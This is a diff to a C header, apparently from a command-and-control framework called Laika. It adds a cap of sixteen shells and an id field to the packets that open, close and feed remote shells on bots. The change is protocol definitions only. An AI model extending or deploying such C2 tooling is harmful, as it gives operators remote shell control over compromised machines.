@@ -13,6 +13,7 @@
 #define LAIKA_INET_LEN 22
 
 #define LAIKA_SHELL_DATA_MAX_LENGTH 2048
+#define LAIKA_MAX_SHELLS 16
 
 /* first handshake between peer & cnc works as so:
     - peer connects to cnc and sends a LAIKAPKT_HANDSHAKE_REQ with the peer's pubkey, hostname & inet ip
@@ -83,15 +84,17 @@ enum {
     */
     LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
     /* layout of LAIKAPKT_SHELL_OPEN:
+    *   uint32_t id; // this field is absent from the panel/auth client
     *   uint16_t cols;
     *   uint16_t rows;
     */
     LAIKAPKT_SHELL_CLOSE, /* if sent to bot, closes a shell. if sent to cnc, signifies a shell was closed */
     /* layout of LAIKAPKT_SHELL_CLOSE:
-    *   NULL (empty packet)
+    *   uint32_t id; // this field is absent from the panel/auth client
     */
     LAIKAPKT_SHELL_DATA, /* if sent to bot, writes data to stdin of shell. if sent to cnc, writes to 'stdout' of shell */
     /* layout of LAIKAPKT_SHELL_DATA
+    *   uint32_t id; // this field is absent from the panel/auth client
     *   char buf[VAR_PACKET_LENGTH];
     */
 /* ==================================================[[ Auth ]]================================================== */
